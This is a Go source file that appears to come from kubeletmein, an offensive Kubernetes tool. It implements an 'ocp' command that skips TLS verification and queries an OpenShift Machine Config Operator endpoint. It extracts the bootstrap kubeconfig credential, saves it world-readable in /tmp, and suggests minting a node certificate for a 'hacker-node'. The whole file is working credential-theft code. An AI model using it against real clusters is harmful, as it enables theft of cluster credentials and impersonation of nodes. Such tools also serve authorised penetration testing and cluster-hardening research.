package bootstrap

import (
	"crypto/tls"
	"github.com/4armed/kubeletmein/pkg/config"
	"github.com/kubicorn/kubicorn/pkg/logger"
	"github.com/spf13/cobra"
	"github.com/tidwall/gjson"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
)

func bootstrapOcpCmd(c *config.Config) *cobra.Command {

	cmd := &cobra.Command{
		Use:              "ocp",
		TraverseChildren: true,
		Short:            "Write out a bootstrap kubeconfig for the kubelet LoadClientCert function for OCP4",
		RunE: func(cmd *cobra.Command, args []string) error {

			http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
			resp, err := http.Get(c.McoEndpoint)
			if err != nil {
				logger.Critical("http get err %s", err)
				return err
			}
			defer resp.Body.Close()

			b, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				logger.Critical("read body err %s", string(b))
				return err
			}

			value := gjson.Get(string(b), `storage.files.#[path="/etc/kubernetes/kubeconfig"].contents.source`)

			decodedSource, err := url.QueryUnescape(value.String())
			if err != nil {
				return err
			}

			kubeConfig := strings.Replace(decodedSource, "data:,", "", 1)

			d1 := []byte(kubeConfig)
			err = ioutil.WriteFile("/tmp/bootstrap-kubeconfig", d1, 0644)
			if err != nil {
				return err
			}

			logger.Info("wrote bootstrap-kubeconfig")
			logger.Info("now generate a new node certificate with: kubeletmein generate -b /tmp/bootstrap-kubeconfig -k /tmp/kubeconfig -n hacker-node -d /tmp/pki")

			return err
		},
	}

	cmd.Flags().StringVarP(&c.McoEndpoint, "mco-endpoint", "m", "", "The MCO endpoint like https://1.1.1.1:22623/config/master")

	return cmd
}
